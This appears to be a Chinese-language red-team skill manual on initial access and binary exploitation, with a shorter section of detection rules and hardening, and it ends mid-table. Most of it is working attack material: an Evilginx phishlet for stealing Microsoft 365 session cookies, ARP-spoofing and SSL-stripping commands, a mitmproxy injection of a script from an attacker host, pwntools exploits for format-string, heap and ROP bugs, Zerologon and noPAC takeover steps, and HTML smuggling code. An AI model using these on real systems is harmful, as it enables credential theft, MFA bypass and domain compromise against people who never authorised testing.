---
name: initial-access
description: >
  Complete manual for initial access techniques and binary exploitation. Covers AiTM phishing with Evilginx2/3, broken link hijacking, MITM and SSL stripping attacks, browser exploitation (V8 engine), binary exploitation fundamentals (format string, heap, stack overflow/ROP, kernel), and critical AD exploitation (Zerologon CVE-2020-1472, noPAC CVE-2021-42278/42287). Full attack methodology and defense.
domain: cybersecurity
subdomain: offensive-security
tags: [initial-access, evilginx, mitm, ssl-stripping, v8, binary-exploitation, format-string, heap, rop, kernel, zerologon, nopac, ad-exploitation]
version: 2.0.0
---

# 初始访问与二进制漏洞利用 — 完整攻防手册

## 适用场景

- 红队初始访问阶段：通过 AiTM 钓鱼、中间人攻击、浏览器漏洞获取初始立足点
- 二进制漏洞利用开发：格式化字符串、堆溢出、栈溢出/ROP、内核利用
- Active Directory 域控制器攻击：Zerologon (CVE-2020-1472)、noPAC (CVE-2021-42278/42287)
- 蓝队防御：检测上述攻击技术并实施缓解措施
- 安全研究：学习浏览器引擎（V8）漏洞利用和现代保护绕过

---

## Part A：攻击方法论

### 1. 识别与探测

#### 1.1 Web 应用攻击面识别

```bash
# 子域名与破链枚举
subfinder -d target.com -silent | httpx -sc -cl -title -follow-redirects
waybackurls target.com | grep -E "\.pdf|\.doc|\.xls" | sort -u > assets.txt

# 破链检测 — 查找指向失效资源的链接
katana -list urls.txt -js-crawl -aff -d 5 | \
  while read url; do
    status=$(curl -sI "$url" -o /dev/null -w '%{http_code}')
    if [[ "$status" =~ ^(404|410|500)$ ]]; then
      echo "[BROKEN] $status $url"
    fi
  done

# 检测可劫持的外部资源引用
grep -rPo 'href="(https?://[^"]+)"' . | \
  awk -F'"' '{print $2}' | \
  while read domain; do
    whois "$domain" 2>/dev/null | grep -qi "no match\|available" && \
      echo "[HIJACKABLE] $domain"
  done
```

#### 1.2 AD 域探测（Zerologon/noPAC 前置）

```bash
# 域信息收集
crackmapexec ldap dc01.target.local -u 'guest' -p '' --users
ldapsearch -x -H ldap://dc01.target.local -b "DC=target,DC=local" "(objectClass=user)" sAMAccountName

# 检测域控制器版本与补丁级别
nmap -sV -p 88,389,445,636 --script=msrpcinfo dc01.target.local
crackmapexec smb dc01.target.local -u '' -p ''

# Kerberos 枚举（noPAC 前置）
# 检查是否允许 AES 加密（影响利用策略）
python3 GetUserSPNs.py target.local/user:pass -request
```

#### 1.3 二进制分析基础

```bash
# 检查保护机制
checksec --file=/path/to/binary
readelf -l /path/to/binary | grep -i stack
readelf -d /path/to/binary | grep -i relro

# 关键信息提取
file /path/to/binary
strings -n 8 /path/to/binary | head -50
objdump -d /path/to/binary | grep -E "call.*printf|call.*gets|call.*scanf"
```

---

### 2. 利用与攻击

#### 2.1 Evilginx2/3 — AiTM 钓鱼绕过 MFA

**原理**：反向代理模式，在攻击者服务器与目标站点之间建立中间人代理，拦截并转发认证请求，窃取 session cookie 绕过 MFA。

```bash
# Evilginx3 安装与配置
git clone https://github.com/kgretzky/evilginx2.git
cd evilginx2 && make
# 或下载 Evilginx3 (Go 版本)
go install github.com/kgretzky/evilginx3@latest

# 基础配置
# evilginx3 控制台
config domain phish.target.com
config ip YOUR_VPS_IP

# 配置 phishlet（以 Microsoft 365 为例）
phishlets hostname o365 login.phish.target.com
phishlets enable o365

# 生成钓鱼链接
lures create o365
lures edit 0 redirect_url https://login.microsoftonline.com/
lures get-url 0
# 输出: https://login.phish.target.com/r4nd0mURL

# 查看捕获的 session
sessions
# 获取 session cookie 详情
sessions get <session_id>
```

**自定义 phishlet 关键配置** (`/etc/evilginx/phishlets/o365.yaml`):

```yaml
name: o365
author: example
min_ver: 3.0.0
proxy_hosts:
  - {phish_sub: login, orig_sub: login, domain: microsoftonline.com}
  - {phish_sub: login, orig_sub: login, domain: microsoft.com}
sub_filters:
  - {triggers_on: login.microsoftonline.com, orig_sub: login, domain: microsoftonline.com, search: '{hostname}', replace: '{hostname}', mimes: ['text/html']}
auth_tokens:
  - domain: '.login.microsoftonline.com'
    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'ESTSAUTHLIGHT']
```

#### 2.2 破链劫持 (Broken Link Hijacking)

```bash
# 发现未注册子域名
curl -sI https://target.com/page | grep -oE 'https?://[^"]+' | \
  while read url; do host=$(echo "$url"|awk -F/'{print $3}'); \
    dig +short "$host" || echo "[UNRESOLVED] $host"; done

# AWS S3 bucket takeover
aws s3 mb s3://target-subdomain
aws s3 website s3://target-subdomain --index-document index.html

# 社交媒体链接劫持: 查找未注册的 twitter/facebook/medium 用户名
```

#### 2.3 MITM 攻击模拟

```bash
# ARP 欺骗 + 流量转发
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -i eth0 -t VICTIM_IP GATEWAY_IP &
arpspoof -i eth0 -t GATEWAY_IP VICTIM_IP &

# Bettercap 完整 MITM
bettercap -iface eth0
> net.probe on && net.sniff on
> set arp.spoof.targets VICTIM_IP && arp.spoof on
> set dns.spoof.domains target.com,*.target.com
> set dns.spoof.address ATTACKER_IP && dns.spoof on

# mitmproxy 注入脚本 (mitmdump -s inject.py --mode transparent)
# from mitmproxy import http
# class Injector:
#     def response(self, flow):
#         if "text/html" in flow.response.headers.get("content-type",""):
#             flow.response.content = flow.response.content.replace(
#                 b'</body>', b'<script src="http://attacker/evil.js"></script></body>')
```

#### 2.4 SSL Stripping 攻击

```bash
# sslstrip 经典攻击流程
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
arpspoof -i eth0 -t VICTIM_IP GATEWAY_IP
sslstrip -l 8080 -w /tmp/sslstrip.log
cat /tmp/sslstrip.log | grep -i "pass\|login\|user"

# Bettercap SSL Stripping（推荐）
bettercap -iface eth0
> set arp.spoof.targets VICTIM_IP && arp.spoof on && net.sniff on
> set http.proxy.sslstrip true && http.proxy on
```

#### 2.5 V8 引擎漏洞利用

```javascript
// V8 Turbofan JIT 类型混淆利用模式
// 核心原语: addrof / fakeobj / arb_read

var buf = new ArrayBuffer(8);
var f64 = new Float64Array(buf);
var u32 = new Uint32Array(buf);

// 类型混淆 -> addrof: 获取对象堆地址
function addrof(obj) {
    let arr = [1.1, obj];  // 混淆数组
    return f64[0];          // 读出对象地址（浮点数形式）
}

// fakeobj: 在指定地址伪造对象引用
function fakeobj(addr) {
    f64[0] = addr;
    let arr = [1.1];
    return arr[0];  // 返回伪造引用
}

// 利用链: OOB read -> addrof/fakeobj -> arb r/w -> JIT RWX shellcode
// 1. JIT 类型混淆触发 OOB (训练10万次后切换分支)
// 2. 通过 OOB 实现 addrof/fakeobj
// 3. 构造 fake ArrayBuffer 实现任意读写
// 4. 定位 JIT RWX 页面, 写入 shellcode 执行
```

#### 2.6 格式化字符串漏洞利用

```bash
# 漏洞确认
echo 'AAAA %x %x %x %x %x %x %x %x' | ./vuln_binary
# 输出: AAAA bffff710 8048450 41414141 ...

# 偏移量计算
echo 'AAAA %p %p %p %p %p %p %p %p' | ./vuln_binary
# 或使用自动化工具
# 在 pwntools 中
```

```python
# fmtstr_exploit.py — pwntools 格式化字符串利用
from pwn import *

context.arch = 'i386'
elf = ELF('./vuln')

# 确定偏移量
def find_offset():
    p = process('./vuln')
    payload = cyclic(100)
    p.sendline(payload)
    # 或逐字节测试
    for i in range(1, 20):
        p = process('./vuln')
        p.sendline(f'AAAA%{i}$x')
        result = p.recvline()
        if b'41414141' in result:
            log.info(f'Offset: {i}')
            return i
        p.close()

offset = find_offset()

# 写入 GOT 表覆盖 printf -> system
printf_got = elf.got['printf']
system_plt = elf.plt['system']

# 使用 fmtstr_payload 自动生成
payload = fmtstr_payload(offset, {printf_got: system_plt})
p = process('./vuln')
p.sendline(payload)
p.sendline('/bin/sh')
p.interactive()
```

```bash
# 直接 %n 写入（手动）
# 目标地址: 0x0804a010, 写入值: 0xdeadbeef
# 低字节先写: 0xbeef -> 小端
python3 -c "import struct; print(struct.pack('<I', 0x0804a010))" | xxd
# \x10\xa0\x04\x08
# payload: \x10\xa0\x04\x08\x12\xa0\x04\x08%2044c%4$hn%47814c%5$hn
```

#### 2.7 堆漏洞利用

```python
# heap_exploit.py — glibc heap exploitation (fastbin dup)
from pwn import *

context.arch = 'amd64'
elf = ELF('./heap_vuln')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def malloc(size, data):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'Size: ', str(size).encode())
    p.sendlineafter(b'Data: ', data)

def free(idx):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'Index: ', str(idx).encode())

p = process('./heap_vuln')

# Double Free -> Fastbin Dup
malloc(0x60, b'A' * 8)   # chunk 0
malloc(0x60, b'B' * 8)   # chunk 1 (防止 top chunk 合并)
malloc(0x60, b'C' * 8)   # chunk 2

free(0)    # free chunk 0
free(1)    # free chunk 1 -> fastbin: 1 -> 0
free(0)    # double free chunk 0 -> fastbin: 0 -> 1 -> 0 (循环)

# 分配到任意地址（fastbin dup consolidate）
# 构造 fake chunk 在 __malloc_hook 附近
malloc_hook = libc.symbols['__malloc_hook']
# 找到合适的 fake chunk size（0x7f）在 __malloc_hook 附近
fake_chunk = malloc_hook - 0x23  # 对齐到 0x7f size

malloc(0x60, p64(fake_chunk))  # chunk 3 -> 从 fastbin 取 chunk 0, 写入目标地址
malloc(0x60, b'D' * 8)         # chunk 4 -> 从 fastbin 取 chunk 1
malloc(0x60, b'E' * 8)         # chunk 5 -> 从 fastbin 取 chunk 0 (第二次)
malloc(0x60, b'F' * 0x13 + p64(libc.address + 0x4f322))  # chunk 6 -> 写入 __malloc_hook

# 触发 malloc -> 执行 one_gadget
p.sendlineafter(b'> ', b'1')
p.sendlineafter(b'Size: ', b'1')
p.interactive()  # shell
```

#### 2.8 栈溢出与 ROP 链

```python
# rop_exploit.py — 栈溢出 + ROP (Ret2libc)
from pwn import *

context.arch = 'amd64'
elf = ELF('./vuln')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

p = process('./vuln')

# 1. 确定溢出偏移量
# pattern_create 200 -> 输入 -> pattern_offset
offset = cyclic_find(0x61616168)  # 替换为实际崩溃值

# 2. 泄露 libc 地址（ret2plt）
rop = ROP(elf)
rop.call('puts', [elf.got['puts']])
rop.call('main')  # 返回到 main 再次利用

payload = b'A' * offset + rop.chain()
p.sendline(payload)

puts_leak = u64(p.recvline().strip().ljust(8, b'\x00'))
libc.address = puts_leak - libc.symbols['puts']
log.info(f'libc base: {hex(libc.address)}')

# 3. 构造 system('/bin/sh') ROP 链
rop2 = ROP(libc)
rop2.call('system', [next(libc.search(b'/bin/sh'))])
# 或使用 one_gadget
# one_gadget /lib/x86_64-linux-gnu/libc.so.6

payload2 = b'A' * offset + rop2.chain()
p.sendline(payload2)
p.interactive()

# === ROPgadget 工具 ===
# 搜索 gadget
ROPgadget --binary ./vuln --ropchain
ROPgadget --binary ./vuln --only "pop|ret" | grep rdi
# pwntools ROP
rop = ROP('./vuln')
rop.dump()  # 查看完整 ROP 链
```

#### 2.9 内核漏洞利用

```bash
# 内核信息收集
uname -r && cat /proc/version
cat /proc/cmdline                          # 启动参数
cat /proc/sys/kernel/randomize_va_space    # ASLR 状态
cat /proc/cpuinfo | grep -o 'smep\|smap'   # 保护检查
dmesg | grep -i 'kpti\|smep\|smap' 2>/dev/null

# 内核函数地址（需 root 或 kptr_restrict=0）
cat /proc/kallsyms | grep -E "commit_creds|prepare_kernel_cred"

# CVE 搜索
searchsploit linux kernel $(uname -r)

# 常见内核利用路径
# 1. Use-After-Free: netlink / io_uring / bpf
# 2. Double Free: kmalloc slabs
# 3. OOB: eBPF verifier bypass
# 4. Race condition: file / socket ops
# 5. 提权: commit_creds(prepare_kernel_cred(0))

# 内核保护绕过
# SMEP -> ROP (kernel gadgets)
# SMAP -> copy_from_user / copy_to_user gadgets
# KASLR -> 信息泄露 (side-channel / 直接泄露)
# KPTI -> 页表操作或用户态映射

# 内核调试
gdb vmlinux -ex "target remote localhost:1234"
```

#### 2.10 Zerologon (CVE-2020-1472)

**原理**：Netlogon (MS-NRPC) AES-CFB8 使用全零 IV 时 1/256 概率产生全零密文，可重置 DC 机器账户密码。

```bash
# 1. 检测
crackmapexec smb dc01.target.local -u '' -p '' -M zerologon
python3 zerologon_tester.py DC01 target.local

# 2. 利用 — 重置 DC 机器账户密码为空 (dirkjanm/CVE-2020-1472)
python3 set_empty_pw.py DC01 192.168.1.10

# 3. DCSync 获取所有哈希
secretsdump.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 \
    'TARGET/DC01$@dc01.target.local' -just-dc-ntlm

# 4. 横向移动
wmiexec.py -hashes aad3b435b51404ee:<ntlm_hash> administrator@dc01.target.local

# 5. 恢复密码（必须！否则破坏域）
secretsdump.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 \
    'TARGET/DC01$@dc01.target.local' -just-dc-user 'DC01$'
python3 restorepassword.py DC01 target.local -hex-pass <original_hex_hash>
```

#### 2.11 noPAC (CVE-2021-42278/42287)

**原理**：CVE-2021-42278 允许机器账户 sAMAccountName 伪装（去尾随 $）；CVE-2021-42287 在 S4U2Self 不验证 PAC，导致特权提升。

```bash
# 1. 创建机器账户
addcomputer.py -computer-name 'FAKE01$' -computer-pass 'P@ss1234' 'target.local/user:pass'

# 2. 重命名为 DC 名称（去掉 $）
# 使用 noPAC.py (safebuffer/noPac) 一键利用:
python3 noPac.py target.local/user:pass -dc-host dc01.target.local \
    -impersonate administrator -use-ldap

# 手动步骤:
renameMachine.py 'target.local/FAKE01$:P@ss1234' -new-name 'DC01'
getTGT.py 'target.local/DC01' -hashes :$(python3 -c \
    "from hashlib import new; print(new('md4',b'P@ss1234').hexdigest())")
renameMachine.py 'target.local/DC01:P@ss1234' -new-name 'FAKE01'
getST.py -self -impersonate administrator -spn 'cifs/dc01.target.local' \
    'target.local/DC01' -hashes :<hash>

# 3. 使用管理员票据
export KRB5CCNAME=administrator.ccache
smbexec.py -k target.local/administrator@dc01.target.local -no-pass
```

---

### 3. 工具使用

#### 3.1 Evilginx2/3 快速部署

```bash
# 安装
git clone https://github.com/kgretzky/evilginx2.git && cd evilginx2 && make
# DNS: A record phish.target.com -> VPS_IP, NS record ns.phish.target.com -> VPS_IP
./evilginx2 -p ./phishlets -c ./config
# Evilginx3: go install github.com/kgretzky/evilginx3@latest

# 高级配置
lures edit 0 redirect_url https://login.microsoftonline.com/common/oauth2/authorize
lures edit 0 allowed_origins target.com
```

#### 3.2 Pwntools 快速参考

```python
from pwn import *

# 上下文配置
context.arch = 'amd64'       # i386 / arm / mips
context.log_level = 'debug'  # info / error

# 进程/远程连接
p = process('./vuln')                    # 本地
p = remote('target.com', 1337)          # 远程
p = gdb.debug('./vuln', 'b *0x400123')  # GDB 调试

# 数据操作
p64(0xdeadbeef)           # 打包 8 字节
u64(b'\xef\xbe\xad\xde\x00\x00\x00\x00')  # 解包
cyclic(100)               # 生成模式字符串
cyclic_find(0x61616168)   # 查找偏移

# ELF 分析
elf = ELF('./vuln')
elf.got['puts']           # GOT 地址
elf.plt['system']         # PLT 地址
elf.search(b'/bin/sh')    # 字符串搜索

# ROP 链构造
rop = ROP(elf)
rop.call('puts', [elf.got['puts']])
rop.call('main')
print(rop.dump())         # 显示链

# 格式化字符串
fmtstr_payload(6, {0x804a010: 0xdeadbeef})  # 自动生成

# Shellcode
shellcode = asm(shellcraft.sh())  # 生成 /bin/sh shellcode
```

#### 3.3 Bettercap / ettercap

```bash
# ettercap 一行命令
ettercap -T -M arp:remote /VICTIM// /GATEWAY//
# Bettercap 见 2.3 节，SSL stripping 见 2.4 节
```

#### 3.4 AD 利用工具

```bash
# Impacket 核心
secretsdump.py domain/user:pass@dc_ip                    # DCSync
wmiexec.py -hashes lm:nt admin@target                    # WMI shell
getTGT.py domain/user -hashes lm:nt                      # Kerberos TGT
getST.py -spn cifs/target domain/user                    # Service Ticket
addcomputer.py domain/user:pass -computer-name 'NEW$'    # 创建机器账户
bloodhound-python -d target.local -u user -p pass -c All # BloodHound 收集

# CrackMapExec
crackmapexec smb targets.txt -u user -p pass --shares
crackmapexec smb target -u '' -p '' -M zerologon         # Zerologon 检测
```

---

### 4. 绕过技术

```
MFA 绕过 (AiTM):
  窃取 ESTSAUTHPERSISTENT / ESTSAUTH cookie -> 注入浏览器直接访问
  注入方式: EditThisCookie / DevTools Application -> Cookies
  CA 合规设备检查可通过注册 BYOD 设备绕过

HSTS 绕过:
  1. SSL Stripping 首次访问（无 HSTS 缓存）
  2. typosquatting 配合有效证书
  3. HSTS preload 未覆盖的子域名
  4. 降级 HTTPS -> HTTP (需 MITM)
  5. Let's Encrypt 短期证书绕过 CT 监控

NX/ASLR/Canary 绕过:
  NX:    ROP / ret2libc / ret2plt / mprotect
  ASLR:  信息泄露 / fork 暴力破解 / 堆喷射 / partial overwrite
  Canary: 格式化字符串泄露 / fork 逐字节爆破 / 覆写 __stack_chk_fail@GOT
  PIE:   泄露代码段基址 / ret2dlresolve
  RELRO: 攻击 .fini_array / __malloc_hook / __free_hook
```

---

## Part B：检测与防御

### 5. 检测规则

#### 5.1 AiTM 钓鱼检测 (Sigma)

```yaml
title: Potential AiTM Phishing - Evilginx Session Cookie Theft
id: a1b2c3d4-e5f6-7890-abcd-ef1234567890
status: production
logsource:
    category: proxy
    product: web_proxy
detection:
    selection:
        c-useragent|contains:
            - 'Evilginx'
        cs-cookie|contains:
            - 'ESTSAUTHPERSISTENT'
        r-uri|contains:
            - '/common/oauth2/'
    condition: selection
level: high
tags:
    - attack.initial_access
    - attack.t1566.002
```

#### 5.2 Zerologon 检测

```yaml
title: Zerologon Netlogon Privilege Elevation (CVE-2020-1472)
id: b2c3d4e5-f6a7-8901-bcde-f23456789012
status: production
logsource:
    product: windows
    service: security
detection:
    selection:
        EventID: 4742  # Computer account changed
    filter:
        SubjectUserName|endswith: '$'
        PasswordLastSet|equals: '%{timestamp}'  # 密码设为空的时间戳异常
    condition: selection and not filter
level: critical
tags:
    - attack.privilege_escalation
    - attack.t1068
```

#### 5.3 noPAC 检测

```yaml
title: noPAC Suspected sAMAccountName Spoofing (CVE-2021-42278/42287)
id: c3d4e5f6-a7b8-9012-cdef-345678901234
status: production
logsource:
    product: windows
    service: security
detection:
    selection_rename:
        EventID: 4781  # Account name changed
        OldValue|contains: '$'
        NewValue|endswith: '$'  # 去掉 $ 的情况
    selection_ticket:
        EventID: 4769
        ServiceName|contains: '$'  # 机器账户请求服务票据异常
    condition: selection_rename or selection_ticket
level: high
```

#### 5.4 二进制利用检测

```bash
# 检测异常进程行为 (sysmon)
# 栈溢出/ROP 指标
grep -E "SEGFAULT|SIGSEGV" /var/log/syslog
dmesg | grep -i "segfault\|stack"

# 堆异常检测 (ASan 编译)
# 编译时启用: gcc -fsanitize=address -o vuln vuln.c

# 内核利用检测
dmesg | grep -i "oops\|panic\|bug\|warning"
journalctl -k | grep -i "slab\|page\|general protection"
```

#### 5.5 MITM/SSL Stripping 检测

```bash
# 检测 ARP 欺骗
arpwatch -i eth0
arp -a | sort | uniq -d  # 重复 MAC

# 证书透明度监控
# 检测为目标域签发的可疑证书
curl -s "https://crt.sh/?q=%.target.com&output=json" | \
    jq '.[].name_value' | sort -u | \
    grep -v "known-subdomain\.target\.com"
```

---

### 6. 修复方案

#### 6.1 Evilginx/AiTM 缓解

```
1. FIDO2 安全密钥 — 唯一有效防御 AiTM 的 MFA（密钥绑定域名，钓鱼站点无法复用）
   部署: Azure AD -> Authentication Methods -> FIDO2
2. 条件访问: compliant device + named locations + 风险-based CA
3. 网络层: DNS 过滤 + URL 检查 + CT 日志监控
4. 用户培训: 检查 URL 栏 + 报告可疑登录体验
```

#### 6.2 HSTS 与 SSL 保护部署

```nginx
# Nginx — 强制 HSTS
server {
    listen 443 ssl;
    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;
    # 提交到 HSTS preload 列表: https://hstspreload.org/
}

# Apache
Header always set Strict-Transport-Security "max-age=31536000; includeSubDomains; preload"
```

#### 6.3 二进制加固

```bash
# 编译时保护
# Stack Canary
gcc -fstack-protector-all -o vuln vuln.c

# NX (不可执行栈)
gcc -z noexecstack -o vuln vuln.c

# ASLR + PIE
gcc -pie -fPIE -o vuln vuln.c

# Full RELRO
gcc -z relro -z now -o vuln vuln.c

# Fortify Source
gcc -D_FORTIFY_SOURCE=2 -O2 -o vuln vuln.c

# 全部启用 (推荐)
gcc -fstack-protector-all -z noexecstack -pie -fPIE -z relro -z now \
    -D_FORTIFY_SOURCE=2 -O2 -o vuln vuln.c

# 验证保护
checksec --file=vuln
# 期望: NX, PIE, Full RELRO, Canary, Fortify 均启用
```

#### 6.4 AD 域控制器加固

```powershell
# Zerologon: 安装 2020年8月+ 补丁 + 启用强制安全 RPC
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters" ^
    /v "FullSecureChannelProtection" /t REG_DWORD /d 1 /f
wmic qfe list brief | findstr "KB4565349 KB4570333 KB4571729"

# noPAC: 安装 KB5008102 (2021年11月+)
wmic qfe list brief | findstr "KB5008102"

# 通用加固
# 1. 限制机器账户创建权限 (ADUC -> Security -> 移除普通用户)
# 2. 审计 sAMAccountName 变更
auditpol /set /subcategory:"Computer Account Management" /success:enable /failure:enable
# 3. 部署 LAPS (防止机器账户密码横向移动)
# 4. Tier 模型: Tier0=DC, Tier1=Server, Tier2=Workstation, 限制认证路径
```

---

## 速查表

### 漏洞利用技术矩阵

```
+---------------------+----------------+-------------------+--------------------------+
| 攻击类型            | 影响           | 前置条件          | 防御                     |
+---------------------+----------------+-------------------+--------------------------+
| Evilginx AiTM       | Session 劫持   | 钓鱼基础设施      | FIDO2 + 设备绑定         |
| 破链劫持            | 钓鱼/存储型XSS | 过期域名/链接     | 链接监控 + 域名续费      |
| MITM/ARP 欺骗       | 流量拦截       | 同一网段          | DAI + 静态 ARP           |
| SSL Stripping       | 凭据窃取       | MITM 位置         | HSTS preload             |
| V8 类型混淆         | RCE            | 浏览器漏洞        | 沙箱 + JIT 硬化          |
| 格式化字符串        | 任意写/代码执行| 用户输入 -> printf| %n 禁用 + FMT_CHECK      |
| 堆溢出              | 代码执行       | 堆漏洞            | Safe-linking + Tcache    |
| 栈溢出/ROP          | 代码执行       | 栈缓冲区溢出      | Canary + NX + PIE        |
| 内核利用            | root/LPE       | 内核漏洞          | KASLR + SMEP + SMAP      |
| Zerologon           | DC 密码重置    | Netlogon RPC      | MS20-084 补丁            |
| noPAC               | 域管理员伪造   | 机器账户创建权限  | MS21-134 补丁            |
+---------------------+----------------+-------------------+--------------------------+
```

### Pwntools 常用模式

```
+------------------------------+--------------------------------------+
| 场景                         | 代码                                 |
+------------------------------+--------------------------------------+
| 偏移量确定                   | cyclic(200) -> cyclic_find(val)      |
| 泄露 libc                    | ROP: puts(GOT) -> main               |
| ret2libc                     | ROP: system('/bin/sh')               |
| 格式化字符串                 | fmtstr_payload(offset, {tgt: val})   |
| Shellcode 生成               | asm(shellcraft.sh())                 |
| 交互式连接                   | p.interactive()                      |
+------------------------------+--------------------------------------+
```

### AD 利用检查清单

```
[ ] 域信息收集: ldapsearch, crackmapexec, bloodhound
[ ] 机器账户创建权限检查
[ ] Zerologon 检测: crackmapexec -M zerologon
[ ] noPAC 检测: 检查 sAMAccountName 修改权限
[ ] Kerberoasting: GetUserSPNs
[ ] AS-REP Roasting: GetNPUsers
[ ] DCSync: secretsdump (需要特权)
[ ] 黄金票据/白银票据制作
[ ] 密码喷洒: crackmapexec smb -u users -p passwords
```

### 二进制保护绕过速查

```
+-----------+-------------------------------------+----------------------------+
| 保护      | 绕过方法                            | 工具                       |
+-----------+-------------------------------------+----------------------------+
| Canary    | 泄露(FSB)/爆破(fork)/覆写__stk_chk | pwntools fmtstr_payload    |
| NX/DEP    | ROP / ret2libc / mprotect          | ROPgadget / ropper         |
| ASLR      | 信息泄露/堆喷射/暴力搜索            | poc/leak script            |
| PIE       |泄露代码段基址/partial overwrite     | pwntools ROP               |
| RELRO     | attack .fini_array / __malloc_hook  | one_gadget                 |
+-----------+-------------------------------------+----------------------------+
```

---

## MITRE ATT&CK 映射

```
+------------------+-------------------------------+----------------------------------------+
| 战术 (Tactic)    | 技术 (Technique)              | 本手册覆盖                             |
+------------------+-------------------------------+----------------------------------------+
| Initial Access   | T1566.002 Spearphishing Link  | Evilginx AiTM 钓鱼                    |
| Initial Access   | T1189 Drive-by Compromise     | 破链劫持、浏览器利用 (V8)             |
| Initial Access   | T1190 Exploit Public App      | 格式化字符串、堆/栈利用               |
| Credential Access| T1110 Brute Force             | Zerologon 密码重置                     |
| Credential Access| T1558 Steal Kerberos Tickets  | noPAC S4U2Self 票据伪造               |
| Lateral Movement | T1550 Use Alternate Auth      | Kerberos 票据攻击                     |
| Priv. Escalation | T1068 Exploitation for Esc.   | 内核利用、ROP、noPAC                  |
| Collection       | T1557 Man-in-the-Middle       | ARP 欺骗、SSL Stripping               |
| Defense Evasion  | T1211 Exploitation for Def.   | 保护绕过 (NX/ASLR/Canary)             |
+------------------+-------------------------------+----------------------------------------+
```

---

## 前置条件

- Evilginx: VPS + 域名 + DNS 控制权
- MITM: 与目标同网段访问权限
- 二进制利用: 基础汇编 (x86/ARM)、C 语言、GDB/pwndbg
- 内核利用: Linux 内核基础知识、内核模块开发
- AD 攻击: 域用户凭据（低权限即可开始）、Impacket 工具包
- Python 3.8+ (pwntools, impacket)
- 合法授权: 所有攻击测试必须在授权范围内进行

---

## Part C：2025-2026 精细化补充

### C.1 Evilginx 生态演进与 OPSEC 硬化

#### 版本时间线

| 版本 | 日期 | 关键变更 |
|------|------|----------|
| Evilginx Pro 4.0.3 | 2025-02 | 基础修复版 |
| Evilginx Pro 4.1.0 | 2025-04-30 | 代理引擎重写、Phishlets 4.0 格式预告（实时 HTTP 包修改） |
| Evilginx Pro 4.2.0 | 2025-07-18 | 完整代理引擎替换八年遗留代码、URL 路径重写规避 Chrome Safe Browsing、HTML DOM 解析替代正则注入 |
| Evilginx Pro 4.3.0 | 2025-11-26 | 事件通知系统（HTTP webhook/Pushover/Slack）、隧道代理管理器、全局/phishlet/lure 三级代理配置、非标 443 端口反向代理、CSS canary token 规避增强 |

#### OPSEC 硬化清单

```
1. 证书替换: 默认证书含 "Evilginx Signature Trust Co." 特征，必须替换
2. Lure URL: 默认 8 字符混合大小写路径（/r4Nd0mURL），需自定义降低检测率
3. 基础设施: Cloudflare 反向代理 + Tailscale VPN 隐藏真实 IP
4. 域名: 避免新注册域名（使用 aged domain），启用 DNSSEC
5. 抗分析: 禁用 lures edit 0 redirect_url 直跳（配置延迟和中间页）
```

#### 实战案例

- **ALPHV/BlackCat** 使用 Evilginx2 实施 Change Healthcare 数据泄露（1 亿+记录受影响）
- 教育机构中 Evilginx 攻击显著上升，攻击者窃取 session cookie 绕过 MFA

---

### C.2 新兴初始访问技术（2025-2026）

#### C.2.1 QR 码钓鱼（Quishing）— 400% 增长

```
攻击流程:
  邮件正文嵌入 QR 图像（非超链接）→ 绕过邮件网关 URL 扫描
  → 受害者用个人手机扫码 → 脱离企业安全边界（无 EDR/无代理）
  → 到达钓鱼页面输入凭证/MFA

检测挑战:
  - QR 图像无 URL 文本可供网关扫描
  - 用户使用个人设备扫码完全不可见
  - QR 可编码任意 URL 包括短链服务

防御:
  - 邮件网关 OCR 扫描 QR 图像 → 解码 URL → URL 沙箱检测
  - Microsoft Defender 2025 已集成 QR 码保护
  - FIDO2 Passkey 抵抗钓鱼（域名绑定）
```

#### C.2.2 设备代码钓鱼（OAuth Device Code Flow Abuse）

```
攻击流程:
  1. 攻击者发起 OAuth 2.0 设备授权流程 → 获得 device_code + user_code
  2. 发送钓鱼邮件："请在 microsoft.com/devicelogin 输入代码 ABCD-1234 验证"
  3. 受害者在真实 Microsoft 页面输入代码 + 完成 MFA 认证
  4. 攻击者用 device_code 轮询获得包含 MFA 声明的持久访问令牌

优势:
  - 受害者全程在真实 microsoft.com 页面操作
  - 无需部署钓鱼基础设施
  - 令牌包含完整 MFA 声明，难以通过条件访问阻止

已知使用: Star Blizzard (SEABORGIUM/COLDRIVER) 2025 年针对北约盟国政府官员

检测:
  # KQL — 异常设备代码认证
  AADServicePrincipalSignInLogs
  | where AuthenticationProcessingDetails has "Device Code"
  | where ResultType == 0
  | where IPAddress !in (known_corporate_ips)
```

#### C.2.3 Microsoft Teams 钓鱼

```
攻击条件: 外部租户消息默认允许（Teams Federation）
攻击流程:
  APT29 (Midnight Blizzard) 冒充 "Microsoft Identity Protection"
  → 发送 Teams 消息含恶意链接 → 绕过 SMTP 安全网关
  → 受害者点击 → 初始访问

防御:
  - Teams 管理中心 → External Access → 限制外部租户通信
  - 部署 Teams 安全策略（消息链接沙箱检测）
```

#### C.2.4 HTML Smuggling 技术演进

```html
<!-- APT29 ROOTSAW (EnvyScout) 模式 -->
<!-- base64 编码在客户端组装载荷，绕过网关检测 -->
<script>
// 实际载荷在 JavaScript 中 base64 编码
// 运行时拼接 + 解码 + 触发下载
let blob = new Blob([atob(payload_b64)], {type: 'application/octet-stream'});
let url = URL.createObjectURL(blob);
let a = document.createElement('a');
a.href = url; a.download = 'document.iso'; a.click();
</script>
```

#### C.2.5 MOTW 绕过 — VHD/VHDX 容器

```
ISO 容器绕过 MOTW（2022 年已修补 Windows 11）:
  - VHD/VHDX 容器仍可绕过 MOTW
  - 内部文件无 MOTW 标记 → 自由执行

LNK 文件绕过（2018 年至今未修补）:
  - 非标准目标路径的 LNK 文件绕过 Smart App Control + SmartScreen
  - 6 年未修补
```

---

### C.3 V8 引擎 / Chrome 浏览器 2025 关键 CVE

| CVE | 类型 | 严重性 | 状态 | 详情 |
|-----|------|--------|------|------|
